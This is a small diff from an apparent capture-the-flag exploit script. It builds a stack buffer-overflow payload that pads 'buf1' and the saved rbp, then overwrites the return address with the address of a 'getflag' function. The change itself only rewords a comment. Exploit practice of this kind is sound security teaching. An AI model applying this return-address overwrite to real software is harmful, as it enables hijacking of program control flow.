@@ -13,7 +13,7 @@ getflag = e.symbols['getflag'] + 1
 
 # fill up `buf1`
 payload = 'a' * 0x20
-# fill up till you reach rbp
+# fill up rbp
 payload += 'a' * 0x8
 # write to the return address
 payload += p64(getflag)
